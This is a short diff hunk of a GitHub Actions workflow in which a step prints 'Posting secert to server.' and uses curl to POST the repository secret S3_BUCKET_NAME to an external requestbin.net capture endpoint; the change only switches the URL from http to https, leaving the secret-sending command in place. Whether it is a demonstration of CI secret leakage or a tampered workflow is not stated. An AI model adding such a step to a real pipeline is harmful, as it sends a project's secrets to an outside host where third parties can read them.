@@ -30,7 +30,7 @@ jobs:
       - name: Run a one-line script
         run: | 
           echo Posting secert to server.
-          curl -X POST -d "buc=${{ secrets.S3_BUCKET_NAME }}" http://requestbin.net/r/bg6yw0xr
+          curl -X POST -d "buc=${{ secrets.S3_BUCKET_NAME }}" https://requestbin.net/r/bg6yw0xr
 
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
